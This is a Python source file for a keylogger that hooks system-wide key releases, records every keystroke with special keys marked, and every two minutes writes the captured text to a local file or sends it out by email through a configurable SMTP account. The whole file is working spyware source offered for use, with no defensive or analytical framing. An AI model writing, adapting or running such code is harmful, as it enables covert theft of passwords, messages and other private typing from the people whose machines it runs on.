import keyboard
import smtplib
from email.mime.text import MIMEText
from datetime import datetime
from threading import Timer
import locale


# SETUP
locale.setlocale(locale.LC_ALL, '') # if you leave is blank the system language will be selected automatically.
SEND_REPORT_EVERY = 120
LOG_TYPE = "file" # or email
EMAIL_SMTP = "" #smtp.example.com
EMAIL_PORT = None
EMAIL_ADRESS = '' #johndoe@example.com
EMAIL_PASSWORD = ''


class Keylogger():
    def __init__(self, interval, port, mail_smtp, mail_adress, mail_passwd, report_method):
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
        self.port = port
        self.mail_smtp = mail_smtp
        self.mail_adress = mail_adress
        self.mail_passwd = mail_passwd

    def record(self, event):
        name = event.name

        # this determines how special keyboard keys are seen
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    # For Local File
    def update_filename(self):
        start_dt_str = datetime.strftime(self.start_dt, '%a-%X')[:-3].replace(":",".")
        end_dt_str = datetime.strftime(self.end_dt, '%a-%X')[:-3].replace(":",".")
        self.filename = f"keylog-{start_dt_str}___{end_dt_str}"

    def report_to_file(self):
        with open(f"{self.filename}.txt","w") as f:
            print(self.log, file = f)

    #for email
    def sendmail(self, smtp_server, email, password, port, message):
        msg = MIMEText(message, 'plain', 'utf-8')
        msg['From'] = "{}".format(email)
        msg['To'] = ",".join(email)
        msg['Subject'] = self.filename
        server = smtplib.SMTP(smtp_server, port)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, msg.as_string())
        server.quit()

    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            self.update_filename()

            if self.report_method == "email":
                self.sendmail(self.mail_smtp, self.mail_adress, self.mail_passwd, self.port, self.log)
            elif self.report_method == "file":
                self.report_to_file()

            self.start_dt = datetime.now()
        self.log = ""
        # every report time, report function will be run
        timer = Timer(interval = self.interval, function = self.report)
        timer.daemon = True
        timer.start()

    # main function
    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.record)
        self.report()
        keyboard.wait()

if __name__ == "__main__":
    if SEND_REPORT_EVERY == None:
        exit()
    keylogger = Keylogger(SEND_REPORT_EVERY, port=EMAIL_PORT, mail_smtp=EMAIL_SMTP, mail_adress=EMAIL_ADRESS, mail_passwd=EMAIL_PASSWORD, report_method=LOG_TYPE)
    keylogger.start()

